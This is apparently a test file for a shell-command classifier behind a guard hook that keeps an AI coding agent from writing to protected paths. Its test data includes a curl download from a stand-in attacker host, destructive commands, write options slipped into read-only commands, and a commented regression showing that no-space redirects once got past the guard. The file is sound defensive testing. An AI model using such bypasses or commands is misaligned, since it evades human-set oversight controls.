// shell.test.mjs — behavioral coverage for the canonical shell classifier
// (lib/shell.mjs). The codex hook keeps a verbatim inline copy (it cannot
// resolve npm at runtime); a drift test at the bottom pins the two together.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  classifyShellCommand,
  collectShellPaths,
  hasUnquotedFileRedirect,
  shellHasExpansion,
  shellHasMutation,
  shellHasOpaqueMutation,
  shellHasWriteOption,
  shellIsPositivelyReadOnly,
  shellChangesCwd,
  shellTokens,
} from '../lib/shell.mjs';

// ---- mutation detection ----
for (const cmd of [
  'echo hi > out.txt',
  'echo hi >> log.txt',
  'node build.mjs 2> err.log',
  'tee results.json',
  'rm -rf dist',
  'mv a.txt b.txt',
  'cp src/a.mjs test/a.mjs',
  'sed -i s/a/b/ file.txt',
  "sed 'w out.txt' in.txt",
  'find . -name "*.tmp" -delete',
  'git commit -m x',
  'git checkout -- test/x.mjs',
  'patch -p1 < fix.diff',
  "node -e \"require('fs').writeFileSync('x','y')\"",
  "python3 -c \"open('f','w').write('x')\"",
]) {
  test(`mutating: ${cmd}`, () => assert.equal(shellHasMutation(cmd), true));
}

for (const cmd of ['git status', 'ls -la', 'grep -r foo src/', 'cat file.txt', 'echo hello']) {
  test(`not mutating: ${cmd}`, () => assert.equal(shellHasMutation(cmd), false));
}

// P5 finding: unlisted writers that must now be detected as mutations.
for (const cmd of [
  'curl -o test/x.mjs https://example.com/x',
  'curl --output test/x.mjs https://example.com/x',
  'wget -O test/x.mjs https://example.com/x',
  'chmod 755 test/x.mjs',
  'chown me test/x.mjs',
  'ln -s a test/x.mjs',
  'mkdir test/sub',
]) {
  test(`mutating (P5-added writer): ${cmd}`, () => assert.equal(shellHasMutation(cmd), true));
}

// P5 finding: a read-only PREFIX must not shadow a later mutator.
test('chained read-only prefix + unlisted mutator is NOT positively read-only', () => {
  assert.equal(shellIsPositivelyReadOnly('git status && curl -o test/x.mjs https://x'), false);
  assert.equal(shellIsPositivelyReadOnly('ls; rm test/x.mjs'), false);
  assert.equal(shellIsPositivelyReadOnly('cat a | tee test/x.mjs'), false);
  // …but an all-read-only chain still is.
  assert.equal(shellIsPositivelyReadOnly('git status && ls && cat file.txt'), true);
});

test('classifyShellCommand: chained read-only prefix + rail writer → mutating with the rail path', () => {
  const c = classifyShellCommand('git status && curl -o test/x.mjs https://attacker.example/p');
  assert.equal(c.readOnly, false);
  assert.equal(c.mutating, true);
  assert.ok(c.paths.includes('test/x.mjs'));
});

// ---- opaque mutations (targets unreadable from the command line) ----
for (const cmd of ['git apply fix.diff', 'git reset --hard', 'tar xf a.tar', 'unzip a.zip', 'patch < d.diff']) {
  test(`opaque: ${cmd}`, () => assert.equal(shellHasOpaqueMutation(cmd), true));
}
test('non-opaque mutation: echo > file', () => assert.equal(shellHasOpaqueMutation('echo x > file.txt'), false));

// ---- positively read-only ----
for (const cmd of ['git status', 'git diff HEAD', 'ls', 'rg pattern', 'cat a.txt', 'sed -n 1,10p f', 'head -5 f', 'npm test', '']) {
  test(`read-only: "${cmd}"`, () => assert.equal(shellIsPositivelyReadOnly(cmd), true));
}
for (const cmd of ['echo hello', 'make', 'npm install', 'cargo build']) {
  test(`NOT positively read-only: ${cmd}`, () => assert.equal(shellIsPositivelyReadOnly(cmd), false));
}

// ---- write-option smuggling on read-only commands ----
test('write option: node --test --test-reporter-destination out.txt', () => {
  assert.equal(shellHasWriteOption('node --test --test-reporter-destination out.txt'), true);
});
test('no write option: git status', () => assert.equal(shellHasWriteOption('git status'), false));

// ---- cwd changes + expansion ----
test('cwd change detected', () => assert.equal(shellChangesCwd('cd sub && echo x > f'), true));
test('expansion detected: $VAR / $( / backtick / glob', () => {
  assert.equal(shellHasExpansion('echo $HOME > f'), true);
  assert.equal(shellHasExpansion('echo $(date) > f'), true);
  assert.equal(shellHasExpansion('echo `date` > f'), true);
  assert.equal(shellHasExpansion('rm *.txt'), true);
  assert.equal(shellHasExpansion('echo literal > file.txt'), false);
});

// ---- path collection ----
test('collectShellPaths: redirect target, quoted path, sed w-file, bare tokens', () => {
  const out = new Set();
  collectShellPaths('echo x > out/a.txt', out);
  assert.ok(out.has('out/a.txt'));
  const out2 = new Set();
  collectShellPaths('cp "src/deep/b.mjs" dst.mjs', out2);
  assert.ok(out2.has('src/deep/b.mjs'));
  assert.ok(out2.has('dst.mjs'));
  const out3 = new Set();
  collectShellPaths("sed 'w captured.txt' in.txt", out3);
  assert.ok(out3.has('captured.txt'));
});

test('shellTokens: quotes and separators', () => {
  assert.deepEqual(shellTokens(`cp "a b.txt" 'c.txt' d.txt`), ['cp', 'a b.txt', 'c.txt', 'd.txt']);
});

// ---- composed classification ----
test('classifyShellCommand: read-only', () => {
  const c = classifyShellCommand('git status');
  assert.equal(c.readOnly, true);
  assert.equal(c.mutating, false);
});
test('classifyShellCommand: transparent mutation carries paths', () => {
  const c = classifyShellCommand('echo x > test/x.mjs');
  assert.equal(c.mutating, true);
  assert.equal(c.opaque, false);
  assert.ok(c.paths.includes('test/x.mjs'));
});
test('classifyShellCommand: opaque mutation flagged', () => {
  const c = classifyShellCommand('git checkout -- test/x.mjs');
  assert.equal(c.mutating, true);
  assert.equal(c.opaque, true);
});

// ---- regression: no-space redirect must NOT read as read-only (rail bypass) ----
// A read-only-looking command whose output is redirected with NO whitespace
// before `>` (e.g. `cat a>rail`) previously slipped past shellHasMutation's
// whitespace-anchored redirect regex and was misclassified "positively
// read-only", so its target was never checked against the rails.
for (const cmd of [
  'cat payload.txt>protected/rail.txt',
  'grep x foo>protected/rail.txt',
  'echo hi>>protected/rail.txt',
  'ls; cat a>protected/rail.txt',
  'cat a>"protected/rail.txt"',
]) {
  test(`classifyShellCommand: no-space redirect is mutating + carries the target — ${cmd}`, () => {
    const c = classifyShellCommand(cmd);
    assert.equal(c.mutating, true, 'must be mutating, not read-only');
    assert.equal(c.readOnly, false);
    assert.ok(c.paths.includes('protected/rail.txt'), `target extracted: ${JSON.stringify(c.paths)}`);
  });
}
test('classifyShellCommand: a QUOTED > is not a redirect (no false positive)', () => {
  const c = classifyShellCommand('grep "[>]" file');
  assert.equal(c.mutating, false);
  assert.equal(c.readOnly, true);
});
test('classifyShellCommand: fd-duplication (2>&1) is not a file write', () => {
  assert.equal(hasUnquotedFileRedirect('grep x foo 2>&1'), false);
  assert.equal(hasUnquotedFileRedirect('cat a>b'), true);
  assert.equal(hasUnquotedFileRedirect("echo '>' safe"), false);
  assert.equal(hasUnquotedFileRedirect('echo hi >&2'), false);
});

// ---- drift pin: the codex hook's inline copy must stay in sync ----
// The codex hook cannot import npm packages at runtime, so it keeps a verbatim
// copy of the classifier bodies. Compare the load-bearing regex sources so an
// edit to either side fails here instead of silently drifting.
test('codex inline copy matches the canonical core classifier', () => {
  const here = dirname(fileURLToPath(import.meta.url));
  const codex = readFileSync(join(here, '..', '..', '..', 'plugins', 'adlc-codex', 'hooks', 'adlc-rails-guard.mjs'), 'utf8');
  const core = readFileSync(join(here, '..', 'lib', 'shell.mjs'), 'utf8');
  // Pin the FULL set of shell classifier + path-extraction functions, not just
  // the boolean classifiers — the path functions decide WHICH paths a mutating
  // command touches (i.e. which edits are blocked as rail violations), so a
  // silent divergence there is a rail-enforcement hole. Signature-agnostic
  // extraction: these take (text), (value), (text, out), etc.
  const PINNED = [
    'shellHasMutation', 'hasUnquotedFileRedirect', 'shellHasOpaqueMutation',
    'shellIsPositivelyReadOnly', 'shellHasWriteOption', 'shellChangesCwd', 'shellHasExpansion',
    'shellTokens', 'collectShellPaths', 'collectPatchPaths', 'looksPathLike',
    'looksBarePathLike', 'keyValuePath',
  ];
  for (const fn of PINNED) {
    const extract = (src) => {
      const m = src.match(new RegExp(`function ${fn}\\([^)]*\\) \\{[\\s\\S]*?\\n\\}`));
      assert.ok(m, `${fn} found`);
      return m[0].replace(/\s+/g, ' ');
    };
    assert.equal(extract(codex), extract(core), `${fn} drifted between codex hook and @adlc/core`);
  }
});
